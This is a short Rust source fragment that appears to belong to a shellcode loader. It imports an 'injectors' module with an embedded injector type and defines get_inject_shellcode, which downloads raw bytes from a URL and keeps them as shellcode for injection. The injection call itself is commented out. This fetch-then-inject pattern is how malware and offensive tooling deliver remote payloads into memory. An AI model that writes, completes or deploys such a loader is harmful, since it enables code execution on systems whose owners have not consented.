mod injectors;
use injectors::{
    InjectorType,
    embedded::EmbeddedInjector
};
use reqwest::blocking::get;




fn get_inject_shellcode(url: &str) {
    if let Ok(res) = get(url) {
        if res.status().is_success() {
            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
            // inject(sc);
        }
    }
}